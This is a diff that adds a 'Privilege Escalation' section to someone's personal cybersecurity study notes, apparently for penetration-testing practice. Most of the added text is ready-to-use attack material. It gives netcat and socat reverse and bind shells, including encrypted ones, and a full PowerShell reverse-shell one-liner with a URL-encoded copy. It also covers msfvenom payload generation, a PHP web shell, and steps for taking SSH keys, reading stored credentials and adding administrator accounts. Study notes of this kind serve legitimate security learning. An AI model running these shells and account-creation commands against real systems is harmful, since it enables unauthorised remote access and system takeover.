@@ -47,6 +47,8 @@ Collection of notes regarding Cybersecurity vocabulary for my personal reference
         + [XSS](#xss)
         + [Command Injection/RCE](#command-injection--rce)
         + [SQLi](#sqli)
++ [Privilege Escalation](#privilege-escalation)
+    + [Tools](#tools)
 ### Offensive Security Tools
 + [Metasploit](#metasploit)
 + [Burp Suite](#burp-suite)
@@ -3424,3 +3426,203 @@ There are ways to protect against SQLis:
 + Prepared Statements w/ Parameterised Queries - this is done by writing SQL queries then adding user inputs to parameters afterwards; ensures SQL code structure does not change
 + Input Validation - employing an allow list can restrict input to certain strings; string replacement methods can filter allowed/disallowed characters
 + Escaping User Input - method of prepending a backslash (i.e. \) to input, which causes them to be parsed as regular strings and not as special characters
+
+## Privilege Escalation
+## Tools
+### Netcat
+Starting a netcat listener for Linux
+```
+nc -lvnp <port-number>
+```
+
+Obtaining a bind shell on a target
+```
+nc <target-ip> <chosen-port>
+```
+
+There are three ways to stabilise netcat shells:
+1. Python
+```
+# Spawn a bash shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Get term commands
+export TERM=xterm
+
+# Background the shell
+stty raw -echo; fg
+```
+2. rlwrap
+```
+# Install rlwrap
+sudo apt install rlwrap
+
+# Invoke listener
+rlwrap nc -lvnp <port>
+```
+Note: this is particularly useful for Windows targets
+3. Socat
+```
+# Establish a webserver from attacking machine
+sudo python3 -m http.server 80
+
+# Download socat static compiled binary
+wget <LOCAL-IP>/socat -O /tmp/socat
+
+# Check tty values
+ssty -a
+
+# Set row and column values
+stty rows <number>
+stty cols <number>
+```
+Note: this is only useful for Linux targets
+
+### Socat
+Execute a reverse shell
+```
+# Set up listener on attacking machine
+socat TCP-L:<port> -
+
+# Connect back to listener
+# For Windows
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+
+# For Linux
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+```
+Execute a bind shell
+```
+# Set up listener on target machine
+# For Windows
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+
+# For Linux
+socat TCP-L:<PORT> EXEC:"bash -li"
+
+# Connect to target machine
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+```
+
+To stabilise a socat shell
+```
+# Stablise special listener
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+
+# Activate listener
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+Note: this is useful for Linux  targets
+
+### Encrypted Socat
+For these shells, it is required to generate a certificate.
+```
+# Generate certificate on attacking machine
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.cr
+
+# Merge two created files
+cat shell.key shell.crt > shell.pem
+```
+
+These certificates can now be incorporated in OPENSSL commands.
+
+For reverse shells
+```
+# Set up listener on attacking machine
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+# Connect back to listener
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+
+For bind shells
+```
+# Set up listener on target machine
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+# Connect back to listener
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+```
+
+### Common Payloads
+Create a listener for a bind shell for Linux
+```
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+Send a netcat reverse shell for Linux
+```
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+One-liner reverse PSH shell for Windows
+```
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+Other common payloads can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+
+### Metasploit msfvenom
+*Msfvenom* is Metasploit's payload generator. This is widely used for reverse and bind shell code generation.
+
+The syntax is as follows:
+```
+msfvenom -p <PAYLOAD> <OPTIONS>
+```
+E.g. msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+### Metasploit multi/handler
+*multi/handler* is a tool for listening for reverse shells. These are essential when using staged payloads.
+
+Using these involve two steps:
+```
+# Open Metasploit
+msfconsole
+
+# Invoke multi/handler
+use multi/handler
+
+# Set options
+# 1. Payload
+set PAYLOAD <payload>
+
+# 2. LHOST
+set LHOST <listen-address>
+
+# 3. LPORT
+set LPORT <listen-port>
+
+# Start listener
+exploit -j
+```
+
+### Web Shells
+Web shells can be used for websites that do not allow upload of file executables. Commands can be entered through HTML or direct arguments in the URL, which are then executed by scripts. Note: these are useful when firewalls are used or to be used as stepping stones.
+
+E.g. PHP web shell
+```
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+```
+
+Note: Kali Linux provides a variety of web shells found in /usr/share/webshells
+
+Note: for Windows, it is easiest to do a URL Encoded PowerShell reverse shell
+```
+# Copy into the URL as the cmd argument
+powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+```
+
+### Next Steps
+For Linux:
++ Look for opportunities to gain access to user accounts. E.g. SSH keys stored at /home/<user>/.ssh
++ Use exploits to add your own accounts or gain SSH access (e.g. [Dirty C0w](https://dirtycow.ninja/), writeable /etc/shadow or /etc/passwd)
+
+For Windows:
++ Find passwords for running services in the registry (e.g. cleartext VNC passwords, FileZilla FTP credentials at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml)
++ Add your own account with administrator privileges; log in via:
+```
+net user <username> <password> /add
+
+or
+
+net localgroup administrators <username> /add
+```
+
